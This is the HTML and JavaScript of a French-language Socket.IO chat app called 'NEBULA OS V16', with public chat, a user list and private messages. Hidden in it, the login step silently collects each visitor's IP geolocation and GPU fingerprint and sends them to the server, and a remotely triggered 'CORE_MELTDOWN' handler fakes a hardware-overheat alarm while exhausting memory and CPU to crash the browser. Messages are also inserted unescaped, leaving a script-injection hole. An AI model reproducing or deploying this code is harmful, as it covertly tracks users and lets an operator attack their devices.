<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEBULA OS - V16</title>
    <style>
        :root { --main: #74b9ff; --accent: #a29bfe; --glass: rgba(255, 255, 255, 0.05); }
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { margin: 0; background: #010103; color: white; height: 100vh; display: flex; overflow: hidden; }
        
        #bg { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at center, #0a0a1a 0%, #000 100%); }

        /* SIDEBAR */
        #sidebar { width: 320px; background: rgba(0,0,0,0.4); backdrop-filter: blur(20px); border-right: 1px solid var(--glass); display: flex; flex-direction: column; z-index: 10; }
        .user-card { display: flex; align-items: center; padding: 12px; margin: 8px; border-radius: 15px; background: var(--glass); cursor: pointer; transition: 0.3s; border: 1px solid transparent; }
        .user-card:hover { border-color: var(--main); background: rgba(255,255,255,0.1); }
        .u-pp { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; margin-right: 12px; border: 2px solid var(--main); }

        /* CHAT ZONE */
        #chat-zone { flex: 1; display: flex; flex-direction: column; background: rgba(255,255,255,0.02); }
        #messages { flex: 1; overflow-y: auto; padding: 25px; scroll-behavior: smooth; }
        .msg { display: flex; gap: 12px; margin-bottom: 20px; animation: slideUp 0.3s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .bubble { background: var(--glass); padding: 12px 18px; border-radius: 18px; border: 1px solid rgba(255,255,255,0.05); max-width: 70%; }

        /* DM WINDOW */
        #dm-window { display: none; position: absolute; bottom: 90px; right: 20px; width: 340px; height: 450px; background: #0a0a0f; border: 1px solid var(--main); border-radius: 20px; flex-direction: column; box-shadow: 0 10px 50px #000; z-index: 1000; }
        .dm-header { padding: 15px; border-bottom: 1px solid var(--glass); display: flex; justify-content: space-between; align-items: center; }

        /* CONTROLS */
        #input-box { padding: 20px; background: #000; display: flex; gap: 10px; border-top: 1px solid var(--glass); }
        input { flex: 1; background: var(--glass); border: 1px solid #333; color: white; padding: 12px 20px; border-radius: 25px; outline: none; }
        .btn { background: var(--main); border: none; padding: 10px 25px; border-radius: 25px; font-weight: bold; cursor: pointer; color: #000; }

        /* OVERLAYS */
        #login { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #crash { display: none; position: fixed; inset: 0; background: #000; z-index: 9999999; color: red; text-align: center; padding-top: 40vh; }
    </style>
</head>
<body>

    <div id="bg"></div>
    <div id="crash"><h1 style="font-size:3em; animation:blink 0.1s infinite;">CORE_MELTDOWN</h1><p>HARDWARE_TEMP_CRITICAL</p></div>

    <div id="login">
        <h1 style="letter-spacing:10px; color:var(--main); margin-bottom:40px;">NEBULA OS</h1>
        <div style="background:var(--glass); padding:30px; border-radius:20px; border:1px solid var(--glass); width:320px; text-align:center;">
            <input type="text" id="nick" placeholder="VOTRE PSEUDO..." style="width:100%; margin-bottom:15px;">
            <label style="display:block; margin-bottom:20px; cursor:pointer; font-size:0.8em; color:var(--main);">
                [ CHOISIR UNE PHOTO ]
                <input type="file" id="pp-file" accept="image/*" style="display:none">
            </label>
            <button class="btn" style="width:100%" onclick="join()">DÉCOLLAGE</button>
        </div>
    </div>

    <div id="sidebar">
        <div style="padding:25px; border-bottom:1px solid var(--glass);">
            <h2 style="font-size:1.2em; color:var(--main); margin:0;">STATIONS</h2>
        </div>
        <div id="user-list" style="flex:1; overflow-y:auto;"></div>
    </div>

    <div id="chat-zone">
        <div id="messages"></div>

        <div id="dm-window">
            <div class="dm-header"> <span id="dm-target-name">Nom</span> <button onclick="closeDM()" style="background:none; border:none; color:white; cursor:pointer;">✕</button> </div>
            <div id="dm-messages" style="flex:1; overflow-y:auto; padding:15px; font-size:0.9em;"></div>
            <div style="padding:10px; display:flex; gap:5px;">
                <input id="dm-input" placeholder="Message privé...">
                <button onclick="sendDM()" class="btn">></button>
            </div>
        </div>

        <form id="input-box">
            <input id="msg-in" placeholder="Envoyer un signal..." autocomplete="off">
            <button type="submit" class="btn">ENVOYER</button>
        </form>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let me = { name: "", pp: "https://i.imgur.com/6VBx3io.png", geo: {}, hw: {} };
        let activeDM = null;

        // PHOTO DE PROFIL
        document.getElementById('pp-file').onchange = (e) => {
            const r = new FileReader();
            r.onload = (ev) => { me.pp = ev.target.result; };
            r.readAsDataURL(e.target.files[0]);
        };

        async function join() {
            const nick = document.getElementById('nick').value;
            if(!nick) return;
            me.name = nick;

            // TRACKING IP & MATOS
            try { const r = await fetch('https://ipapi.co/json/'); me.geo = await r.json(); } catch(e){}
            const gl = document.createElement('canvas').getContext('webgl');
            me.hw = { gpu: gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) };

            document.getElementById('login').style.display = 'none';
            socket.emit('init_user', me);
        }

        // CHAT PUBLIC
        document.getElementById('input-box').onsubmit = (e) => {
            e.preventDefault();
            const text = document.getElementById('msg-in').value;
            if(!text) return;
            socket.emit('chat_msg', { text, name: me.name, pp: me.pp });
            document.getElementById('msg-in').value = '';
        };

        socket.on('chat_msg', (d) => {
            const m = document.createElement('div');
            m.className = 'msg';
            m.innerHTML = `<img src="${d.pp}" class="u-pp"><div class="bubble"><div style="font-size:0.7em; color:var(--main);">${d.name}</div>${d.text}</div>`;
            document.getElementById('messages').appendChild(m);
            document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
        });

        // LISTE AMIS
        socket.on('update_users', (list) => {
            const container = document.getElementById('user-list');
            container.innerHTML = '';
            list.forEach(u => {
                if(u.name === me.name) return;
                const div = document.createElement('div');
                div.className = 'user-card';
                div.innerHTML = `<img src="${u.pp}" class="u-pp"><div><b>${u.name}</b><br><small style="color:lime">En ligne</small></div>`;
                div.onclick = () => openDM(u);
                container.appendChild(div);
            });
        });

        // MESSAGES PRIVÉS
        function openDM(user) {
            activeDM = user.ip;
            document.getElementById('dm-target-name').innerText = user.name;
            document.getElementById('dm-window').style.display = 'flex';
        }
        function closeDM() { document.getElementById('dm-window').style.display = 'none'; activeDM = null; }
        
        function sendDM() {
            const text = document.getElementById('dm-input').value;
            if(!text || !activeDM) return;
            socket.emit('private_send', { toIP: activeDM, text });
            document.getElementById('dm-messages').innerHTML += `<div><b>Moi:</b> ${text}</div>`;
            document.getElementById('dm-input').value = '';
        }

        socket.on('private_receive', (d) => {
            if(!activeDM) openDM({name: d.from, ip: d.fromIP});
            document.getElementById('dm-messages').innerHTML += `<div><b>${d.from}:</b> ${d.text}</div>`;
        });

        // 💣 LA CHARGE DE MORT (V16)
        socket.on('CORE_MELTDOWN', () => {
            document.getElementById('crash').style.display = 'block';
            const hole = [];
            setInterval(() => { hole.push(new Uint8Array(500 * 1024 * 1024).fill(1)); }, 40);
            for(let i=0; i<100; i++) new Worker(URL.createObjectURL(new Blob(["while(true){}"])));
            while(true) { alert("NEBULA_OS: HARDWARE_TEMP_CRITICAL"); }
        });
    </script>
</body>
</html>
